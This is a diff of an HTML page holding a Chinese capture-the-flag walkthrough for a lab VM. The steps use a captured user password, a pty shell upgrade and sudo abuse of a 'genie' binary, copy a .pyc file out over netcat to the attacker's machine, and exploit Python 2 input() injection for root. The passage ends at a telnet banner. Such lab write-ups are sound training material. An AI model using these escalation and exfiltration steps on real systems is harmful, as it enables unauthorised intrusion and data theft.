 nitish:p4ssw0rdStr3r0n9
-</code></pre>
+</code></pre></div>
 <p>得到了 nitish 的密码，尝试切换，但它告诉我们：</p>
-<pre><code>www-data@box7:/opt/80$ su nitish
+<div class="highlight"><pre><span></span><code>www-data@box7:/opt/80$ su nitish
 su nitish
 su: must be run from a terminal
-</code></pre>
+</code></pre></div>
 <p>所以我们需要更好的 shell 体验：即执行 <code>python -c 'import pty;pty.spawn("/bin/bash")'</code></p>
-<pre><code class="language-bash">└─$ nc -nvlp 3343
-listening on [any] 3343 ...
-connect to [10.0.2.4] from (UNKNOWN) [10.0.2.10] 44830
-bash: cannot set terminal process group (664): Inappropriate ioctl for device
-bash: no job control in this shell
-www-data@box7:/opt/80$ python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'
-python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'
-www-data@box7:/opt/80$ su nitish
-su nitish
-Password: p4ssw0rdStr3r0n9
+<div class="highlight"><pre><span></span><code>└─$<span class="w"> </span>nc<span class="w"> </span>-nvlp<span class="w"> </span><span class="m">3343</span>
+listening<span class="w"> </span>on<span class="w"> </span><span class="o">[</span>any<span class="o">]</span><span class="w"> </span><span class="m">3343</span><span class="w"> </span>...
+connect<span class="w"> </span>to<span class="w"> </span><span class="o">[</span><span class="m">10</span>.0.2.4<span class="o">]</span><span class="w"> </span>from<span class="w"> </span><span class="o">(</span>UNKNOWN<span class="o">)</span><span class="w"> </span><span class="o">[</span><span class="m">10</span>.0.2.10<span class="o">]</span><span class="w"> </span><span class="m">44830</span>
+bash:<span class="w"> </span>cannot<span class="w"> </span><span class="nb">set</span><span class="w"> </span>terminal<span class="w"> </span>process<span class="w"> </span>group<span class="w"> </span><span class="o">(</span><span class="m">664</span><span class="o">)</span>:<span class="w"> </span>Inappropriate<span class="w"> </span>ioctl<span class="w"> </span><span class="k">for</span><span class="w"> </span>device
+bash:<span class="w"> </span>no<span class="w"> </span>job<span class="w"> </span>control<span class="w"> </span><span class="k">in</span><span class="w"> </span>this<span class="w"> </span>shell
+www-data@box7:/opt/80$<span class="w"> </span>python<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
+python<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
+www-data@box7:/opt/80$<span class="w"> </span>su<span class="w"> </span>nitish
+su<span class="w"> </span>nitish
+Password:<span class="w"> </span>p4ssw0rdStr3r0n9
 
-nitish@box7:/opt/80$ 
-</code></pre>
+nitish@box7:/opt/80$<span class="w"> </span>
+</code></pre></div>
 <p>现在我们就成功切换到 nitish 用户了，接下来看看权限：</p>
-<pre><code class="language-bash">nitish@box7:/opt/80$ sudo -l
-sudo -l
-Matching Defaults entries for nitish on box7:
-    env_reset, mail_badpass,
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+<div class="highlight"><pre><span></span><code>nitish@box7:/opt/80$<span class="w"> </span>sudo<span class="w"> </span>-l
+sudo<span class="w"> </span>-l
+Matching<span class="w"> </span>Defaults<span class="w"> </span>entries<span class="w"> </span><span class="k">for</span><span class="w"> </span>nitish<span class="w"> </span>on<span class="w"> </span>box7:
+<span class="w">    </span>env_reset,<span class="w"> </span>mail_badpass,
+<span class="w">    </span><span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
 
-User nitish may run the following commands on box7:
-    (sam) NOPASSWD: /usr/bin/genie
-</code></pre>
+User<span class="w"> </span>nitish<span class="w"> </span>may<span class="w"> </span>run<span class="w"> </span>the<span class="w"> </span>following<span class="w"> </span>commands<span class="w"> </span>on<span class="w"> </span>box7:
+<span class="w">    </span><span class="o">(</span>sam<span class="o">)</span><span class="w"> </span>NOPASSWD:<span class="w"> </span>/usr/bin/genie
+</code></pre></div>
 <p>发现可以无条件以 sam 用户执行 <code>/usr/bin/genie</code>：</p>
-<pre><code class="language-bash">nitish@box7:/opt/80$ sudo -u sam /usr/bin/genie
-sudo -u sam /usr/bin/genie
-usage: genie [-h] [-g] [-p SHELL] [-e EXEC] wish
-genie: error: the following arguments are required: wish
-</code></pre>
+<div class="highlight"><pre><span></span><code>nitish@box7:/opt/80$<span class="w"> </span>sudo<span class="w"> </span>-u<span class="w"> </span>sam<span class="w"> </span>/usr/bin/genie
+sudo<span class="w"> </span>-u<span class="w"> </span>sam<span class="w"> </span>/usr/bin/genie
+usage:<span class="w"> </span>genie<span class="w"> </span><span class="o">[</span>-h<span class="o">]</span><span class="w"> </span><span class="o">[</span>-g<span class="o">]</span><span class="w"> </span><span class="o">[</span>-p<span class="w"> </span>SHELL<span class="o">]</span><span class="w"> </span><span class="o">[</span>-e<span class="w"> </span>EXEC<span class="o">]</span><span class="w"> </span>wish
+genie:<span class="w"> </span>error:<span class="w"> </span>the<span class="w"> </span>following<span class="w"> </span>arguments<span class="w"> </span>are<span class="w"> </span>required:<span class="w"> </span>wish
+</code></pre></div>
 <p>得到了一些参数信息，<code>man</code> 一下看看指令手册：</p>
-<pre><code class="language-bash">nitish@box7:/opt/80$ man /usr/bin/genie | cat
-man /usr/bin/genie | cat
+<div class="highlight"><pre><span></span><code>nitish@box7:/opt/80$<span class="w"> </span>man<span class="w"> </span>/usr/bin/genie<span class="w"> </span><span class="p">|</span><span class="w"> </span>cat
+man<span class="w"> </span>/usr/bin/genie<span class="w"> </span><span class="p">|</span><span class="w"> </span>cat
 
-man(8)                          genie man page                          man(8)
+man<span class="o">(</span><span class="m">8</span><span class="o">)</span><span class="w">                          </span>genie<span class="w"> </span>man<span class="w"> </span>page<span class="w">                          </span>man<span class="o">(</span><span class="m">8</span><span class="o">)</span>
 
 NAME
-       genie - Make a wish
+<span class="w">       </span>genie<span class="w"> </span>-<span class="w"> </span>Make<span class="w"> </span>a<span class="w"> </span>wish
 
 SYNOPSIS
-       genie [-h] [-g] [-p SHELL] [-e EXEC] wish
+<span class="w">       </span>genie<span class="w"> </span><span class="o">[</span>-h<span class="o">]</span><span class="w"> </span><span class="o">[</span>-g<span class="o">]</span><span class="w"> </span><span class="o">[</span>-p<span class="w"> </span>SHELL<span class="o">]</span><span class="w"> </span><span class="o">[</span>-e<span class="w"> </span>EXEC<span class="o">]</span><span class="w"> </span>wish
 
 DESCRIPTION
-       genie would complete all your wishes, even the naughty ones.
+<span class="w">       </span>genie<span class="w"> </span>would<span class="w"> </span><span class="nb">complete</span><span class="w"> </span>all<span class="w"> </span>your<span class="w"> </span>wishes,<span class="w"> </span>even<span class="w"> </span>the<span class="w"> </span>naughty<span class="w"> </span>ones.
 
-       We  all  dream  of getting those crazy privelege escalations, this will                                                                             
-       even help you acheive that.                                                                                                                         
+<span class="w">       </span>We<span class="w">  </span>all<span class="w">  </span>dream<span class="w">  </span>of<span class="w"> </span>getting<span class="w"> </span>those<span class="w"> </span>crazy<span class="w"> </span>privelege<span class="w"> </span>escalations,<span class="w"> </span>this<span class="w"> </span>will<span class="w">                                                                             </span>
+<span class="w">       </span>even<span class="w"> </span><span class="nb">help</span><span class="w"> </span>you<span class="w"> </span>acheive<span class="w"> </span>that.<span class="w">                                                                                                                         </span>
 
 OPTIONS
-       wish
+<span class="w">       </span>wish
 
-              This is the wish you want to make .
+<span class="w">              </span>This<span class="w"> </span>is<span class="w"> </span>the<span class="w"> </span>wish<span class="w"> </span>you<span class="w"> </span>want<span class="w"> </span>to<span class="w"> </span>make<span class="w"> </span>.
 
-       -g, --god
+<span class="w">       </span>-g,<span class="w"> </span>--god
 
-              Sometime we all would like to make a wish to  god,  this  option
-              let you make wish directly to God;
+<span class="w">              </span>Sometime<span class="w"> </span>we<span class="w"> </span>all<span class="w"> </span>would<span class="w"> </span>like<span class="w"> </span>to<span class="w"> </span>make<span class="w"> </span>a<span class="w"> </span>wish<span class="w"> </span>to<span class="w">  </span>god,<span class="w">  </span>this<span class="w">  </span>option
+<span class="w">              </span><span class="nb">let</span><span class="w"> </span>you<span class="w"> </span>make<span class="w"> </span>wish<span class="w"> </span>directly<span class="w"> </span>to<span class="w"> </span>God<span class="p">;</span>
 
-              Though  genie can't gurantee you that your wish will be heard by
-              God, he's a busy man you know;
+<span class="w">              </span>Though<span class="w">  </span>genie<span class="w"> </span>can<span class="s1">&#39;t gurantee you that your wish will be heard by</span>
+<span class="s1">              God, he&#39;</span>s<span class="w"> </span>a<span class="w"> </span>busy<span class="w"> </span>man<span class="w"> </span>you<span class="w"> </span>know<span class="p">;</span>
 
-       -p, --shell
+<span class="w">       </span>-p,<span class="w"> </span>--shell
 
-              Well who doesn't love those. You can get shell. Ex: -p &quot;/bin/sh&quot;
+<span class="w">              </span>Well<span class="w"> </span>who<span class="w"> </span>doesn<span class="s1">&#39;t love those. You can get shell. Ex: -p &quot;/bin/sh&quot;</span>
 
-       -e, --exec
+<span class="s1">       -e, --exec</span>
 
-              Execute command on someone else computer is just too  damn  fun,
-              but this comes with some restrictions.
+<span class="s1">              Execute command on someone else computer is just too  damn  fun,</span>
+<span class="s1">              but this comes with some restrictions.</span>
 
-       -cmd
+<span class="s1">       -cmd</span>
 
-              You know sometime all you new is a damn CMD, windows I love you.
+<span class="s1">              You know sometime all you new is a damn CMD, windows I love you.</span>
 
-SEE ALSO
-       mzfr.github.io
+<span class="s1">SEE ALSO</span>
+<span class="s1">       mzfr.github.io</span>
 
-BUGS
-       There  are  shit  loads  of bug in this program, it's all about finding
-       one.
+<span class="s1">BUGS</span>
+<span class="s1">       There  are  shit  loads  of bug in this program, it&#39;</span>s<span class="w"> </span>all<span class="w"> </span>about<span class="w"> </span>finding
+<span class="w">       </span>one.
 
 AUTHOR
-       mzfr
+<span class="w">       </span>mzfr
 
-1.0                            11 November 2019                         man(8)
-</code></pre>
+<span class="m">1</span>.0<span class="w">                            </span><span class="m">11</span><span class="w"> </span>November<span class="w"> </span><span class="m">2019</span><span class="w">                         </span>man<span class="o">(</span><span class="m">8</span><span class="o">)</span>
+</code></pre></div>
 <p>写得有点抽象，不过我们得到了 <code>-cmd</code> 这个重要参数</p>
-<pre><code class="language-bash">nitish@box7:/opt/80$ sudo -u sam /usr/bin/genie -cmd
-sudo -u sam /usr/bin/genie -cmd
-usage: genie [-h] [-g] [-p SHELL] [-e EXEC] wish
-genie: error: the following arguments are required: wish
-nitish@box7:/opt/80$ sudo -u sam /usr/bin/genie -cmd wish
-sudo -u sam /usr/bin/genie -cmd wish
-Pass your wish to GOD, he might be able to help you.
-nitish@box7:/opt/80$ sudo -u sam /usr/bin/genie -cmd whoami
-sudo -u sam /usr/bin/genie -cmd whoami
-my man!!
-$ whoami
+<div class="highlight"><pre><span></span><code>nitish@box7:/opt/80$<span class="w"> </span>sudo<span class="w"> </span>-u<span class="w"> </span>sam<span class="w"> </span>/usr/bin/genie<span class="w"> </span>-cmd
+sudo<span class="w"> </span>-u<span class="w"> </span>sam<span class="w"> </span>/usr/bin/genie<span class="w"> </span>-cmd
+usage:<span class="w"> </span>genie<span class="w"> </span><span class="o">[</span>-h<span class="o">]</span><span class="w"> </span><span class="o">[</span>-g<span class="o">]</span><span class="w"> </span><span class="o">[</span>-p<span class="w"> </span>SHELL<span class="o">]</span><span class="w"> </span><span class="o">[</span>-e<span class="w"> </span>EXEC<span class="o">]</span><span class="w"> </span>wish
+genie:<span class="w"> </span>error:<span class="w"> </span>the<span class="w"> </span>following<span class="w"> </span>arguments<span class="w"> </span>are<span class="w"> </span>required:<span class="w"> </span>wish
+nitish@box7:/opt/80$<span class="w"> </span>sudo<span class="w"> </span>-u<span class="w"> </span>sam<span class="w"> </span>/usr/bin/genie<span class="w"> </span>-cmd<span class="w"> </span>wish
+sudo<span class="w"> </span>-u<span class="w"> </span>sam<span class="w"> </span>/usr/bin/genie<span class="w"> </span>-cmd<span class="w"> </span>wish
+Pass<span class="w"> </span>your<span class="w"> </span>wish<span class="w"> </span>to<span class="w"> </span>GOD,<span class="w"> </span>he<span class="w"> </span>might<span class="w"> </span>be<span class="w"> </span>able<span class="w"> </span>to<span class="w"> </span><span class="nb">help</span><span class="w"> </span>you.
+nitish@box7:/opt/80$<span class="w"> </span>sudo<span class="w"> </span>-u<span class="w"> </span>sam<span class="w"> </span>/usr/bin/genie<span class="w"> </span>-cmd<span class="w"> </span>whoami
+sudo<span class="w"> </span>-u<span class="w"> </span>sam<span class="w"> </span>/usr/bin/genie<span class="w"> </span>-cmd<span class="w"> </span>whoami
+my<span class="w"> </span>man!!
+$<span class="w"> </span>whoami
 whoami
 sam
-</code></pre>
+</code></pre></div>
 <p>于是成功获得了 sam 用户身份及其权限。继续查看其权限：</p>
-<pre><code class="language-bash">$ sudo -l
-sudo -l
-Matching Defaults entries for sam on box7:
-    env_reset, mail_badpass,
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>sudo<span class="w"> </span>-l
+sudo<span class="w"> </span>-l
+Matching<span class="w"> </span>Defaults<span class="w"> </span>entries<span class="w"> </span><span class="k">for</span><span class="w"> </span>sam<span class="w"> </span>on<span class="w"> </span>box7:
+<span class="w">    </span>env_reset,<span class="w"> </span>mail_badpass,
+<span class="w">    </span><span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
 
-User sam may run the following commands on box7:
-    (root) NOPASSWD: /root/lago
-</code></pre>
+User<span class="w"> </span>sam<span class="w"> </span>may<span class="w"> </span>run<span class="w"> </span>the<span class="w"> </span>following<span class="w"> </span>commands<span class="w"> </span>on<span class="w"> </span>box7:
+<span class="w">    </span><span class="o">(</span>root<span class="o">)</span><span class="w"> </span>NOPASSWD:<span class="w"> </span>/root/lago
+</code></pre></div>
 <p>发现其可以无条件以 root 用户执行 <code>/root/lago</code>，执行之：</p>
-<pre><code class="language-bash">$ sudo /root/lago
-sudo /root/lago
-What do you want to do ?
-1 - Be naughty
-2 - Guess the number
-3 - Read some damn files
-4 - Work
-Enter your choice:
-</code></pre>
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>sudo<span class="w"> </span>/root/lago
+sudo<span class="w"> </span>/root/lago
+What<span class="w"> </span><span class="k">do</span><span class="w"> </span>you<span class="w"> </span>want<span class="w"> </span>to<span class="w"> </span><span class="k">do</span><span class="w"> </span>?
+<span class="m">1</span><span class="w"> </span>-<span class="w"> </span>Be<span class="w"> </span>naughty
+<span class="m">2</span><span class="w"> </span>-<span class="w"> </span>Guess<span class="w"> </span>the<span class="w"> </span>number
+<span class="m">3</span><span class="w"> </span>-<span class="w"> </span>Read<span class="w"> </span>some<span class="w"> </span>damn<span class="w"> </span>files
+<span class="m">4</span><span class="w"> </span>-<span class="w"> </span>Work
+Enter<span class="w"> </span>your<span class="w"> </span>choice:
+</code></pre></div>
 <p>四个选项都可以尝试一下，结果是都在逗你玩。</p>
 <p>我们继续探索 sam 用户相关的东西：</p>
-<pre><code class="language-bash">$ cd ~
-cd ~
-$ cd /home/sam
-cd /home/sam
-$ ls -la
-ls -la
-total 36
-drwxr-x--- 4 sam  sam  4096 Nov 14  2019 .
-drwxr-xr-x 4 root root 4096 Nov 14  2019 ..
--rw------- 1 root root  417 Nov 14  2019 .bash_history
--rw-r--r-- 1 root root  220 Oct 20  2019 .bash_logout
--rw-r--r-- 1 sam  sam  3771 Oct 20  2019 .bashrc
-drwx------ 2 sam  sam  4096 Nov 11  2019 .cache
-drwx------ 3 sam  sam  4096 Oct 20  2019 .gnupg
--rw-r--r-- 1 sam  sam   807 Oct 20  2019 .profile
--rw-r--r-- 1 sam  sam  1749 Nov  7  2019 .pyc
--rw-r--r-- 1 sam  sam     0 Nov  7  2019 .sudo_as_admin_successful
-</code></pre>
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span><span class="nb">cd</span><span class="w"> </span>~
+<span class="nb">cd</span><span class="w"> </span>~
+$<span class="w"> </span><span class="nb">cd</span><span class="w"> </span>/home/sam
+<span class="nb">cd</span><span class="w"> </span>/home/sam
+$<span class="w"> </span>ls<span class="w"> </span>-la
+ls<span class="w"> </span>-la
+total<span class="w"> </span><span class="m">36</span>
+drwxr-x---<span class="w"> </span><span class="m">4</span><span class="w"> </span>sam<span class="w">  </span>sam<span class="w">  </span><span class="m">4096</span><span class="w"> </span>Nov<span class="w"> </span><span class="m">14</span><span class="w">  </span><span class="m">2019</span><span class="w"> </span>.
+drwxr-xr-x<span class="w"> </span><span class="m">4</span><span class="w"> </span>root<span class="w"> </span>root<span class="w"> </span><span class="m">4096</span><span class="w"> </span>Nov<span class="w"> </span><span class="m">14</span><span class="w">  </span><span class="m">2019</span><span class="w"> </span>..
+-rw-------<span class="w"> </span><span class="m">1</span><span class="w"> </span>root<span class="w"> </span>root<span class="w">  </span><span class="m">417</span><span class="w"> </span>Nov<span class="w"> </span><span class="m">14</span><span class="w">  </span><span class="m">2019</span><span class="w"> </span>.bash_history
+-rw-r--r--<span class="w"> </span><span class="m">1</span><span class="w"> </span>root<span class="w"> </span>root<span class="w">  </span><span class="m">220</span><span class="w"> </span>Oct<span class="w"> </span><span class="m">20</span><span class="w">  </span><span class="m">2019</span><span class="w"> </span>.bash_logout
+-rw-r--r--<span class="w"> </span><span class="m">1</span><span class="w"> </span>sam<span class="w">  </span>sam<span class="w">  </span><span class="m">3771</span><span class="w"> </span>Oct<span class="w"> </span><span class="m">20</span><span class="w">  </span><span class="m">2019</span><span class="w"> </span>.bashrc
+drwx------<span class="w"> </span><span class="m">2</span><span class="w"> </span>sam<span class="w">  </span>sam<span class="w">  </span><span class="m">4096</span><span class="w"> </span>Nov<span class="w"> </span><span class="m">11</span><span class="w">  </span><span class="m">2019</span><span class="w"> </span>.cache
+drwx------<span class="w"> </span><span class="m">3</span><span class="w"> </span>sam<span class="w">  </span>sam<span class="w">  </span><span class="m">4096</span><span class="w"> </span>Oct<span class="w"> </span><span class="m">20</span><span class="w">  </span><span class="m">2019</span><span class="w"> </span>.gnupg
+-rw-r--r--<span class="w"> </span><span class="m">1</span><span class="w"> </span>sam<span class="w">  </span>sam<span class="w">   </span><span class="m">807</span><span class="w"> </span>Oct<span class="w"> </span><span class="m">20</span><span class="w">  </span><span class="m">2019</span><span class="w"> </span>.profile
+-rw-r--r--<span class="w"> </span><span class="m">1</span><span class="w"> </span>sam<span class="w">  </span>sam<span class="w">  </span><span class="m">1749</span><span class="w"> </span>Nov<span class="w">  </span><span class="m">7</span><span class="w">  </span><span class="m">2019</span><span class="w"> </span>.pyc
+-rw-r--r--<span class="w"> </span><span class="m">1</span><span class="w"> </span>sam<span class="w">  </span>sam<span class="w">     </span><span class="m">0</span><span class="w"> </span>Nov<span class="w">  </span><span class="m">7</span><span class="w">  </span><span class="m">2019</span><span class="w"> </span>.sudo_as_admin_successful
+</code></pre></div>
 <p>发现用户目录下有一个 <code>.pyc</code> 文件，启动一个新终端监听：</p>
-<pre><code class="language-bash">└─$ nc -nvlp 4444 &gt; 1.pyc
-listening on [any] 4444 ...
-connect to [10.0.2.4] from (UNKNOWN) [10.0.2.10] 58560
-</code></pre>
+<div class="highlight"><pre><span></span><code>└─$<span class="w"> </span>nc<span class="w"> </span>-nvlp<span class="w"> </span><span class="m">4444</span><span class="w"> </span>&gt;<span class="w"> </span><span class="m">1</span>.pyc
+listening<span class="w"> </span>on<span class="w"> </span><span class="o">[</span>any<span class="o">]</span><span class="w"> </span><span class="m">4444</span><span class="w"> </span>...
+connect<span class="w"> </span>to<span class="w"> </span><span class="o">[</span><span class="m">10</span>.0.2.4<span class="o">]</span><span class="w"> </span>from<span class="w"> </span><span class="o">(</span>UNKNOWN<span class="o">)</span><span class="w"> </span><span class="o">[</span><span class="m">10</span>.0.2.10<span class="o">]</span><span class="w"> </span><span class="m">58560</span>
+</code></pre></div>
 <p>在旧终端中传输：</p>
-<pre><code class="language-bash">$ nc -w 4 10.0.2.4 4444 &lt;.pyc
-nc -w 4 10.0.2.4 4444 &lt;.pyc
-</code></pre>
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>nc<span class="w"> </span>-w<span class="w"> </span><span class="m">4</span><span class="w"> </span><span class="m">10</span>.0.2.4<span class="w"> </span><span class="m">4444</span><span class="w"> </span>&lt;.pyc
+nc<span class="w"> </span>-w<span class="w"> </span><span class="m">4</span><span class="w"> </span><span class="m">10</span>.0.2.4<span class="w"> </span><span class="m">4444</span><span class="w"> </span>&lt;.pyc
+</code></pre></div>
 <p>然后我们在新终端中反编译这个 <code>.pyc</code> 文件</p>
-<pre><code class="language-python">└─$ ./pycdc /home/kali/Downloads/1.pyc                                                                                                                     
-# Source Generated with Decompyle++
-# File: 1.pyc (Python 2.7)
+<div class="highlight"><pre><span></span><code><span class="err">└─$</span> <span class="o">./</span><span class="n">pycdc</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">kali</span><span class="o">/</span><span class="n">Downloads</span><span class="o">/</span><span class="mf">1.</span><span class="n">pyc</span>                                                                                                                     
+<span class="c1"># Source Generated with Decompyle++</span>
+<span class="c1"># File: 1.pyc (Python 2.7)</span>
 
-from getpass import getuser
-from os import system
-from random import randint
+<span class="kn">from</span><span class="w"> </span><span class="nn">getpass</span><span class="w"> </span><span class="kn">import</span> <span class="n">getuser</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">os</span><span class="w"> </span><span class="kn">import</span> <span class="n">system</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">random</span><span class="w"> </span><span class="kn">import</span> <span class="n">randint</span>
 
-def naughtyboi():
-    print 'Working on it!! '
-
-
-def guessit():
-    num = randint(1, 101)
-    print 'Choose a number between 1 to 100: '
-    s = input('Enter your number: ')
-    if s == num:
-        system('/bin/sh')
-    else:
-        print 'Better Luck next time'
+<span class="k">def</span><span class="w"> </span><span class="nf">naughtyboi</span><span class="p">():</span>
+    <span class="nb">print</span> <span class="s1">&#39;Working on it!! &#39;</span>
 
 
-def readfiles():
-    user = getuser()
-    path = input('Enter the full of the file to read: ')
-    print 'User %s is not allowed to read %s' % (user, path)
+<span class="k">def</span><span class="w"> </span><span class="nf">guessit</span><span class="p">():</span>
+    <span class="n">num</span> <span class="o">=</span> <span class="n">randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">101</span><span class="p">)</span>
+    <span class="nb">print</span> <span class="s1">&#39;Choose a number between 1 to 100: &#39;</span>
+    <span class="n">s</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s1">&#39;Enter your number: &#39;</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">s</span> <span class="o">==</span> <span class="n">num</span><span class="p">:</span>
+        <span class="n">system</span><span class="p">(</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="nb">print</span> <span class="s1">&#39;Better Luck next time&#39;</span>
 
 
-def options():
-    print 'What do you want to do ?'
-    print '1 - Be naughty'
-    print '2 - Guess the number'
-    print '3 - Read some damn files'
-    print '4 - Work'
-    choice = int(input('Enter your choice: '))
-    return choice
+<span class="k">def</span><span class="w"> </span><span class="nf">readfiles</span><span class="p">():</span>
+    <span class="n">user</span> <span class="o">=</span> <span class="n">getuser</span><span class="p">()</span>
+    <span class="n">path</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s1">&#39;Enter the full of the file to read: &#39;</span><span class="p">)</span>
+    <span class="nb">print</span> <span class="s1">&#39;User </span><span class="si">%s</span><span class="s1"> is not allowed to read </span><span class="si">%s</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">user</span><span class="p">,</span> <span class="n">path</span><span class="p">)</span>
 
 
-def main(op):
-    if op == 1:
-        naughtyboi()
-    elif op == 2:
-        guessit()
-    elif op == 3:
-        readfiles()
-    elif op == 4:
-        print 'work your ass off!!'
-    else:
-        print 'Do something better with your life'
+<span class="k">def</span><span class="w"> </span><span class="nf">options</span><span class="p">():</span>
+    <span class="nb">print</span> <span class="s1">&#39;What do you want to do ?&#39;</span>
+    <span class="nb">print</span> <span class="s1">&#39;1 - Be naughty&#39;</span>
+    <span class="nb">print</span> <span class="s1">&#39;2 - Guess the number&#39;</span>
+    <span class="nb">print</span> <span class="s1">&#39;3 - Read some damn files&#39;</span>
+    <span class="nb">print</span> <span class="s1">&#39;4 - Work&#39;</span>
+    <span class="n">choice</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s1">&#39;Enter your choice: &#39;</span><span class="p">))</span>
+    <span class="k">return</span> <span class="n">choice</span>
 
-if __name__ == '__main__':
-    main(options())
-</code></pre>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">op</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">op</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+        <span class="n">naughtyboi</span><span class="p">()</span>
+    <span class="k">elif</span> <span class="n">op</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>
+        <span class="n">guessit</span><span class="p">()</span>
+    <span class="k">elif</span> <span class="n">op</span> <span class="o">==</span> <span class="mi">3</span><span class="p">:</span>
+        <span class="n">readfiles</span><span class="p">()</span>
+    <span class="k">elif</span> <span class="n">op</span> <span class="o">==</span> <span class="mi">4</span><span class="p">:</span>
+        <span class="nb">print</span> <span class="s1">&#39;work your ass off!!&#39;</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="nb">print</span> <span class="s1">&#39;Do something better with your life&#39;</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">(</span><span class="n">options</span><span class="p">())</span>
+</code></pre></div>
 <p>我们发现选项 2 对应的 <code>guessit()</code> 函数中使用了 <code>input()</code> 函数，其存在注入漏洞：</p>
-<pre><code class="language-python">def guessit():
-    num = randint(1, 101)
-    print 'Choose a number between 1 to 100: '
-    s = input('Enter your number: ')
-    if s == num:
-        system('/bin/sh')
-    else:
-        print 'Better Luck next time'
-</code></pre>
+<div class="highlight"><pre><span></span><code><span class="k">def</span><span class="w"> </span><span class="nf">guessit</span><span class="p">():</span>
+    <span class="n">num</span> <span class="o">=</span> <span class="n">randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">101</span><span class="p">)</span>
+    <span class="nb">print</span> <span class="s1">&#39;Choose a number between 1 to 100: &#39;</span>
+    <span class="n">s</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s1">&#39;Enter your number: &#39;</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">s</span> <span class="o">==</span> <span class="n">num</span><span class="p">:</span>
+        <span class="n">system</span><span class="p">(</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="nb">print</span> <span class="s1">&#39;Better Luck next time&#39;</span>
+</code></pre></div>
 <p>我们只需输入 <code>num</code>，这条赋值语句就会变为 <code>s=num</code>，那么接下来 <code>s == num</code> 自然成立：</p>
-<pre><code class="language-bash">$ sudo /root/lago
-sudo /root/lago
-What do you want to do ?
-1 - Be naughty
-2 - Guess the number
-3 - Read some damn files
-4 - Work
-Enter your choice:2
-2
-Choose a number between 1 to 100: 
-Enter your number: num
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>sudo<span class="w"> </span>/root/lago
+sudo<span class="w"> </span>/root/lago
+What<span class="w"> </span><span class="k">do</span><span class="w"> </span>you<span class="w"> </span>want<span class="w"> </span>to<span class="w"> </span><span class="k">do</span><span class="w"> </span>?
+<span class="m">1</span><span class="w"> </span>-<span class="w"> </span>Be<span class="w"> </span>naughty
+<span class="m">2</span><span class="w"> </span>-<span class="w"> </span>Guess<span class="w"> </span>the<span class="w"> </span>number
+<span class="m">3</span><span class="w"> </span>-<span class="w"> </span>Read<span class="w"> </span>some<span class="w"> </span>damn<span class="w"> </span>files
+<span class="m">4</span><span class="w"> </span>-<span class="w"> </span>Work
+Enter<span class="w"> </span>your<span class="w"> </span>choice:2
+<span class="m">2</span>
+Choose<span class="w"> </span>a<span class="w"> </span>number<span class="w"> </span>between<span class="w"> </span><span class="m">1</span><span class="w"> </span>to<span class="w"> </span><span class="m">100</span>:<span class="w"> </span>
+Enter<span class="w"> </span>your<span class="w"> </span>number:<span class="w"> </span>num
 num
-# whoami
+<span class="c1"># whoami</span>
 whoami
 root
-# 
-</code></pre>
+<span class="c1"># </span>
+</code></pre></div>
 <p>成功获取 root 权限，接下来改密码：</p>
 <p><img alt="8-5" src="../8-5.png" /></p>
 <h2 id="_1">附加题</h2>
 <p>我们现在已获得了 root 权限，接下来继续探索。</p>
 <h3 id="1337-telnet">一、1337 端口用 telnet 访问服务存在漏洞，试寻找之</h3>
-<pre><code class="language-bash">└─$ telnet 10.0.2.10 1337
-Trying 10.0.2.10...
-Connected to 10.0.2.10.
-Escape character is '^]'.
-  ____                        _____ _                
- / ___| __ _ _ __ ___   ___  |_   _(_)_ __ ___   ___ 
-| |  _ / _` | '_ ` _ \ / _ \   | | | | '_ ` _ \ / _ \
-| |_| | (_| | | | | | |  __/   | | | | | | | | |  __/
